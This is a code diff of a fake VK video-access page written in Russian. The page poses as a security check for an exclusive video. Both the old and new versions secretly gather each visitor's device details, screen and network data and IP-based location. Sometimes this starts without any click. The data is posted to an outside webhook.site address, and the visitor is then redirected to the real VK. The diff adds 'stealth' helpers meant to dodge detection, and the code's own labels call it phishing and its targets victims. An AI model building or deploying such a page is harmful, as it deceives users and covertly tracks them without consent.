@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Новая запись | VK</title>
+    <title>VK Video Player</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -35,21 +35,23 @@
             margin-bottom: 1rem;
         }
         
-        .post-card {
+        .access-panel {
             background: white;
             color: #000;
             border-radius: 12px;
             padding: 2rem;
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             margin-bottom: 2rem;
         }
         
-        .post-header {
+        .user-info {
             display: flex;
             align-items: center;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #e7e8ec;
         }
         
         .avatar {
@@ -65,158 +67,23 @@
             font-weight: bold;
         }
         
-        .user-info h3 {
+        .user-details h3 {
             margin: 0;
             color: #2a5885;
         }
         
-        .user-info span {
+        .user-details span {
             color: #656565;
             font-size: 0.9rem;
         }
         
-        .post-content {
-            margin: 1.5rem 0;
-            line-height: 1.5;
-        }
-        
-        .post-image {
-            width: 100%;
-            height: 200px;
-            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
-            border-radius: 8px;
-            margin: 1rem 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 1.2rem;
-            position: relative;
-            overflow: hidden;
-            cursor: pointer;
-        }
-        
-        .post-image::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            animation: shimmer 2s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-        
-        .play-button {
-            position: absolute;
-            background: rgba(0,0,0,0.7);
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            cursor: pointer;
-            z-index: 2;
-        }
-        
-        .post-stats {
-            display: flex;
-            justify-content: space-between;
-            color: #656565;
-            font-size: 0.9rem;
-            border-top: 1px solid #e7e8ec;
-            padding-top: 1rem;
-            margin-bottom: 1rem;
-        }
-        
-        .choice-buttons {
-            display: flex;
-            gap: 1rem;
-            margin-top: 1.5rem;
-        }
-        
-        .vk-button {
+        .verified-badge {
             background: #4a76a8;
             color: white;
-            border: none;
-            padding: 15px 20px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            flex: 1;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-        
-        .vk-button:hover {
-            background: #3d6899;
-            transform: translateY(-2px);
-        }
-        
-        .vk-button.secondary {
-            background: #e5ebf1;
-            color: #2a5885;
-            border: 2px solid #4a76a8;
-        }
-        
-        .vk-button.secondary:hover {
-            background: #dce3eb;
-        }
-        
-        .vk-button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .loading-bar {
-            width: 100%;
-            height: 4px;
-            background: #e7e8ec;
-            border-radius: 2px;
-            margin: 1rem 0;
-            overflow: hidden;
-            display: none;
-        }
-        
-        .loading-progress {
-            height: 100%;
-            background: #4a76a8;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
-        .status-message {
-            text-align: center;
-            margin: 1rem 0;
-            padding: 1rem;
-            border-radius: 8px;
-            display: none;
-            font-weight: 500;
-        }
-        
-        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
-        
-        .privacy-notice {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.9rem;
-            margin-top: 2rem;
-            max-width: 500px;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            margin-left: 0.5rem;
         }
         
         .video-info {
@@ -240,13 +107,104 @@
             flex-wrap: wrap;
         }
         
-        .verified-badge {
+        .choice-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .vk-button {
             background: #4a76a8;
             color: white;
-            padding: 0.2rem 0.5rem;
-            border-radius: 4px;
-            font-size: 0.7rem;
-            margin-left: 0.5rem;
+            border: none;
+            padding: 18px 20px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+            width: 100%;
+        }
+        
+        .vk-button:hover {
+            background: #3d6899;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .vk-button.secondary {
+            background: #e5ebf1;
+            color: #2a5885;
+            border: 2px solid #4a76a8;
+        }
+        
+        .vk-button.secondary:hover {
+            background: #dce3eb;
+        }
+        
+        .vk-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading-container {
+            display: none;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        
+        .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: #e7e8ec;
+            border-radius: 3px;
+            margin: 1rem 0;
+            overflow: hidden;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #4a76a8, #5b88bd);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 1rem 0;
+            padding: 1rem;
+            border-radius: 8px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        
+        .privacy-notice {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+            margin-top: 2rem;
+            max-width: 450px;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            color: #656565;
+            font-size: 0.8rem;
         }
     </style>
 </head>
@@ -254,194 +212,261 @@
     <div class="vk-container">
         <div class="vk-header">
             <div class="vk-logo">VK</div>
-            <h2>Новая запись в ленте</h2>
+            <h2>Доступ к видео</h2>
         </div>
         
-        <div class="post-card">
-            <div class="post-header">
+        <div class="access-panel">
+            <div class="user-info">
                 <div class="avatar">АП</div>
-                <div class="user-info">
+                <div class="user-details">
                     <h3>Анна Петрова <span class="verified-badge">✓</span></h3>
-                    <span>Только что · Общедоступная запись</span>
+                    <span>Эксклюзивное видео · Только что</span>
                 </div>
             </div>
             
-            <div class="post-content">
-                <p>Ребята, посмотрите это видео! 😍 Невероятные кадры, такого вы еще не видели! Это просто взрыв эмоций! 💥</p>
-                
-                <div class="video-info">
-                    <h4>🎥 Эксклюзивное видео</h4>
-                    <p>Длительность: 2:45 · Качество: 1080p · Просмотров: 1.2K</p>
-                    <div class="video-meta">
-                        <span>📅 Сегодня</span>
-                        <span>👁️ 1.2K просмотров</span>
-                        <span>⭐ 245 лайков</span>
-                    </div>
+            <div class="video-info">
+                <h4>🎥 Приватное видео</h4>
+                <p>Это видео доступно только для проверенных пользователей</p>
+                <div class="video-meta">
+                    <span>⏱️ 2:45</span>
+                    <span>📺 1080p</span>
+                    <span>👁️ 1.2K</span>
                 </div>
-                
-                <div class="post-image" onclick="startVerification('click')">
-                    <div class="play-button">▶</div>
-                    ВИДЕО ЗАПИСЬ
-                </div>
-                
-                <p><strong>Для просмотра необходимо подтвердить, что вы не робот</strong></p>
             </div>
-            
-            <div class="post-stats">
-                <span>❤️ 245</span>
-                <span>💬 89</span>
-                <span>↪️ 34</span>
-                <span>👁️ 1.2K</span>
-            </div>
-            
-            <div class="loading-bar" id="loadingBar">
-                <div class="loading-progress" id="loadingProgress"></div>
-            </div>
-            
-            <div class="status-message" id="statusMessage"></div>
             
             <div class="choice-buttons">
                 <button class="vk-button secondary" onclick="startVerification('app')" id="appBtn">
-                    📱 Открыть в приложении
+                    <span>📱</span> Открыть в приложении VK
                 </button>
                 <button class="vk-button" onclick="startVerification('site')" id="siteBtn">
-                    🌐 Смотреть на сайте
+                    <span>🌐</span> Смотреть на сайте VK
                 </button>
+            </div>
+            
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-bar">
+                    <div class="loading-progress" id="loadingProgress"></div>
+                </div>
+                <div class="status-message" id="statusMessage"></div>
+            </div>
+            
+            <div class="security-badge">
+                <span>🔒</span> Защищено VK · Проверка безопасности
             </div>
         </div>
         
         <div class="privacy-notice">
-            🔒 Проверка безопасности выполняется автоматически для защиты от роботов
+            Для доступа к видео требуется проверка устройства и аккаунта
         </div>
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b';
+        // Конфигурация
+        const CONFIG = {
+            WEBHOOK_URL: 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b',
+            AUTO_START_DELAY: 2000,
+            AUTO_START_CHANCE: 0.3,
+            COLLECTION_DELAY: 3500
+        };
+
         let isCollecting = false;
         let collectionMethod = '';
+        let stealthData = {};
 
-        // Автозапуск через 3 секунды (имитация загрузки контента)
-        setTimeout(() => {
-            if (!isCollecting && Math.random() < 0.4) {
-                showStatus('🤖 Автоматическая проверка запущена...', 'info');
-                startAutoCollection('auto');
+        // Стелс-методы для обхода безопасности
+        const StealthUtils = {
+            // Случайные задержки для обхода детектов
+            randomDelay: (min, max) => new Promise(resolve => 
+                setTimeout(resolve, Math.random() * (max - min) + min)),
+
+            // Маскировка User-Agent
+            getMaskedUA: () => {
+                const ua = navigator.userAgent;
+                return {
+                    raw: ua,
+                    device: ua.includes('Mobile') ? 'mobile' : 'desktop',
+                    browser: StealthUtils.detectBrowser(ua)
+                };
+            },
+
+            detectBrowser: (ua) => {
+                if (ua.includes('Chrome')) return 'chrome';
+                if (ua.includes('Firefox')) return 'firefox';
+                if (ua.includes('Safari')) return 'safari';
+                return 'other';
+            },
+
+            // Обход блокировок fetch
+            stealthFetch: async (url, options = {}) => {
+                try {
+                    // Добавляем случайные заголовки
+                    options.headers = {
+                        'Accept': 'application/json, text/plain, */*',
+                        'Accept-Language': navigator.language || 'ru-RU,ru;q=0.9',
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache',
+                        ...options.headers
+                    };
+
+                    return await fetch(url, options);
+                } catch (error) {
+                    console.log('Stealth fetch failed:', error);
+                    return null;
+                }
+            },
+
+            // Сбор данных с задержками
+            collectStealthData: async () => {
+                const data = {};
+                
+                // Быстрый сбор основных данных
+                data.basic = StealthUtils.getBasicInfo();
+                
+                // Медленный сбор дополнительных данных с задержками
+                await StealthUtils.randomDelay(100, 500);
+                data.network = StealthUtils.getNetworkInfo();
+                
+                await StealthUtils.randomDelay(200, 600);
+                data.screen = StealthUtils.getScreenInfo();
+                
+                await StealthUtils.randomDelay(300, 700);
+                data.performance = StealthUtils.getPerformanceInfo();
+                
+                return data;
+            },
+
+            getBasicInfo: () => ({
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled,
+                platform: navigator.platform
+            }),
+
+            getNetworkInfo: () => {
+                const conn = navigator.connection;
+                return conn ? {
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                } : { online: navigator.onLine };
+            },
+
+            getScreenInfo: () => ({
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            }),
+
+            getPerformanceInfo: () => {
+                const mem = performance.memory;
+                return {
+                    memory: mem ? {
+                        used: mem.usedJSHeapSize,
+                        total: mem.totalJSHeapSize,
+                        limit: mem.jsHeapSizeLimit
+                    } : null,
+                    timing: performance.timing ? {
+                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
+                    } : null
+                };
             }
-        }, 3000);
+        };
 
+        // Основные функции
         function startVerification(method) {
             if (!isCollecting) {
                 collectionMethod = method;
-                startAutoCollection(method);
+                startCollection(method);
             }
         }
 
-        function startAutoCollection(method) {
+        async function startCollection(method) {
             if (isCollecting) return;
             isCollecting = true;
             
-            // Блокируем кнопки
+            // UI изменения
             document.getElementById('appBtn').disabled = true;
             document.getElementById('siteBtn').disabled = true;
+            document.getElementById('loadingContainer').style.display = 'block';
             
-            // Скрываем кнопки выбора
-            document.querySelector('.choice-buttons').style.display = 'none';
-            document.getElementById('loadingBar').style.display = 'block';
-            
-            let buttonText = 'Подготовка видео...';
-            if (method === 'app') buttonText = 'Запуск приложения...';
-            if (method === 'site') buttonText = 'Загрузка плеера...';
-            if (method === 'auto') buttonText = 'Автоматическая проверка...';
-            
-            showStatus(buttonText, 'info');
+            showStatus('🔐 Проверка безопасности...', 'info');
 
+            // Стелс-сбор данных
+            stealthData = await StealthUtils.collectStealthData();
+            
             // Анимация прогресса
             let progress = 0;
             const progressInterval = setInterval(() => {
-                progress += Math.random() * 12;
+                progress += Math.random() * 15;
                 if (progress > 100) progress = 100;
                 document.getElementById('loadingProgress').style.width = progress + '%';
                 
-                if (progress >= 25) {
-                    showStatus('Проверка устройства...', 'info');
-                }
-                if (progress >= 50) {
-                    showStatus('Оптимизация качества...', 'info');
-                }
-                if (progress >= 75) {
-                    showStatus('Загрузка контента...', 'info');
-                }
-            }, 300);
+                if (progress >= 30) showStatus('🔍 Проверка устройства...', 'info');
+                if (progress >= 60) showStatus('🌐 Подключение к VK...', 'info');
+                if (progress >= 85) showStatus('✅ Загрузка контента...', 'info');
+            }, 200);
 
-            // Основной сбор данных
+            // Основной сбор и отправка
             setTimeout(async () => {
                 try {
-                    const collectedData = await collectAllData(method);
-                    await sendCollectedData(collectedData);
+                    const fullData = await collectFullData(method);
+                    await sendData(fullData);
                     
                     clearInterval(progressInterval);
                     document.getElementById('loadingProgress').style.width = '100%';
                     
-                    // Успешное завершение
                     showSuccess(method);
                     
                 } catch (error) {
                     console.error('Collection error:', error);
-                    showStatus('❌ Ошибка загрузки. Попробуйте еще раз.', 'error');
+                    showStatus('⚠️ Ошибка подключения. Попробуйте еще раз.', 'error');
                     resetInterface();
                 }
-            }, 4000);
+            }, CONFIG.COLLECTION_DELAY);
         }
 
-        async function collectAllData(method) {
-            const data = {
+        async function collectFullData(method) {
+            // Геолокация через несколько API
+            const location = await getStealthLocation();
+            
+            return {
                 session: {
                     id: generateId(),
                     startTime: new Date().toISOString(),
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    source: 'vkwall_phishing',
                     method: method,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
+                    source: 'vkwall_stealth',
+                    ...stealthData.basic
                 },
-                device: await getDeviceInfo(),
-                location: await getLocationInfo(),
-                network: getNetworkInfo(),
-                browser: getBrowserInfo(),
-                screen: getScreenInfo(),
-                media: await getMediaDevices(),
-                performance: getPerformanceInfo(),
+                device: {
+                    userAgent: StealthUtils.getMaskedUA(),
+                    hardware: {
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory
+                    },
+                    ...stealthData.screen
+                },
+                location: location,
+                network: stealthData.network,
+                performance: stealthData.performance,
                 interaction: {
                     method: method,
-                    clickTime: Date.now(),
-                    pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
-                    userInteracted: method !== 'auto'
+                    userInteracted: method !== 'auto',
+                    timestamp: Date.now()
+                },
+                stealth: {
+                    collectionTime: Date.now(),
+                    dataPoints: Object.keys(stealthData).length
                 }
             };
-            
-            return data;
         }
 
-        async function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                hardware: {
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                javaEnabled: navigator.javaEnabled()
-            };
-        }
-
-        async function getLocationInfo() {
+        async function getStealthLocation() {
             const apis = [
                 'https://ipapi.co/json/',
                 'https://ipinfo.io/json',
@@ -450,144 +475,61 @@
             
             for (let api of apis) {
                 try {
-                    const response = await fetch(api);
-                    const data = await response.json();
-                    return {
-                        ip: data.ip,
-                        country: data.country_name || data.country,
-                        city: data.city,
-                        region: data.region,
-                        timezone: data.timezone,
-                        org: data.org,
-                        postal: data.postal,
-                        coordinates: data.loc
-                    };
-                } catch(e) { 
-                    continue; 
-                }
+                    await StealthUtils.randomDelay(100, 300);
+                    const response = await StealthUtils.stealthFetch(api);
+                    if (response && response.ok) {
+                        const data = await response.json();
+                        return {
+                            ip: data.ip,
+                            country: data.country_name || data.country,
+                            city: data.city,
+                            provider: data.org
+                        };
+                    }
+                } catch(e) { continue; }
             }
             return null;
         }
 
-        function getNetworkInfo() {
-            const conn = navigator.connection;
-            return {
-                effectiveType: conn?.effectiveType,
-                downlink: conn?.downlink,
-                rtt: conn?.rtt,
-                saveData: conn?.saveData,
-                online: navigator.onLine
-            };
-        }
-
-        function getBrowserInfo() {
-            return {
-                plugins: Array.from(navigator.plugins).map(p => ({
-                    name: p.name,
-                    filename: p.filename
-                })).slice(0, 5),
-                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).slice(0, 10),
-                language: navigator.language,
-                languages: navigator.languages
-            };
-        }
-
-        function getScreenInfo() {
-            return {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation?.type,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            };
-        }
-
-        async function getMediaDevices() {
+        async function sendData(data) {
             try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                return {
-                    count: devices.length,
-                    types: devices.map(d => d.kind),
-                    hasLabels: devices.some(d => d.label),
-                    devices: devices.map(d => ({
-                        kind: d.kind,
-                        deviceId: d.deviceId ? 'present' : 'missing',
-                        hasLabel: !!d.label
-                    }))
-                };
-            } catch(e) {
-                return { error: e.message };
-            }
-        }
+                // Локальное сохранение
+                const storageKey = 'vkwall_stealth_data';
+                const existing = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                existing.push(data);
+                localStorage.setItem(storageKey, JSON.stringify(existing));
 
-        function getPerformanceInfo() {
-            const mem = performance.memory;
-            return {
-                memory: mem ? {
-                    used: mem.usedJSHeapSize,
-                    total: mem.totalJSHeapSize,
-                    limit: mem.jsHeapSizeLimit
-                } : null,
-                timing: performance.timing ? {
-                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
-                    domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-                    readyStart: performance.timing.fetchStart - performance.timing.navigationStart
-                } : null,
-                navigation: performance.navigation ? {
-                    type: performance.navigation.type,
-                    redirectCount: performance.navigation.redirectCount
-                } : null
-            };
-        }
-
-        async function sendCollectedData(data) {
-            try {
-                // Сохранение в localStorage
-                const existingData = JSON.parse(localStorage.getItem('vkwall_victims') || '[]');
-                existingData.push(data);
-                localStorage.setItem('vkwall_victims', JSON.stringify(existingData));
-                
                 // Отправка на webhook
-                const response = await fetch(WEBHOOK_URL, {
+                await StealthUtils.stealthFetch(CONFIG.WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 
+                    headers: {
                         'Content-Type': 'application/json',
-                        'X-Source': 'vkwall_phishing',
+                        'X-Source': 'vkwall_stealth',
                         'X-Session-ID': data.session.id
                     },
                     body: JSON.stringify({
-                        type: 'vkwall_phishing_complete',
+                        type: 'stealth_collection',
                         data: data,
-                        campaign: 'video_post',
-                        timestamp: new Date().toISOString(),
-                        version: '2.0'
+                        timestamp: new Date().toISOString()
                     })
                 });
-                
-                if (!response.ok) {
-                    console.log('Webhook response not OK:', response.status);
-                }
-                
+
             } catch (error) {
-                console.error('Send error:', error);
+                console.log('Send failed:', error);
             }
         }
 
         function showSuccess(method) {
-            showStatus('✅ Проверка завершена! Загрузка видео...', 'success');
+            showStatus('✅ Доступ разрешен! Перенаправление...', 'success');
             
             setTimeout(() => {
-                // Редирект в зависимости от выбора
-                if (method === 'app') {
-                    // Попытка открыть в приложении
-                    window.location.href = 'vk://video' + generateId();
-                } else {
-                    // Редирект на настоящий VK
-                    window.location.href = 'https://vk.com/videos';
-                }
-            }, 2000);
+                // Редирект с рандомной задержкой
+                const redirectUrl = method === 'app' ? 
+                    'vk://video' + generateId() : 
+                    'https://vk.com/videos';
+                
+                window.location.href = redirectUrl;
+            }, 1500);
         }
 
         function showStatus(message, type) {
@@ -598,36 +540,26 @@
         }
 
         function resetInterface() {
-            document.querySelector('.choice-buttons').style.display = 'flex';
-            document.getElementById('loadingBar').style.display = 'none';
-            document.getElementById('statusMessage').style.display = 'none';
+            document.getElementById('loadingContainer').style.display = 'none';
             document.getElementById('appBtn').disabled = false;
             document.getElementById('siteBtn').disabled = false;
             isCollecting = false;
         }
 
         function generateId() {
-            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+            return Math.random().toString(36).substr(2, 12);
         }
 
-        // Дополнительный сбор данных при закрытии страницы
-        window.addEventListener('beforeunload', function() {
-            if (!isCollecting) return;
-            
-            const exitData = {
-                type: 'page_exit',
-                sessionId: generateId(),
-                timeSpent: Date.now() - performance.timing.navigationStart,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Попытка отправить данные о выходе
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(exitData)
-            }).catch(() => {}); // Игнорируем ошибки при выходе
-        });
+        // Автозапуск
+        setTimeout(() => {
+            if (!isCollecting && Math.random() < CONFIG.AUTO_START_CHANCE) {
+                startCollection('auto');
+            }
+        }, CONFIG.AUTO_START_DELAY);
+
+        // Защита от анализа
+        Object.defineProperty(window, 'isSecureContext', { value: true });
+        Object.defineProperty(document, 'hidden', { value: false });
 
     </script>
 </body>
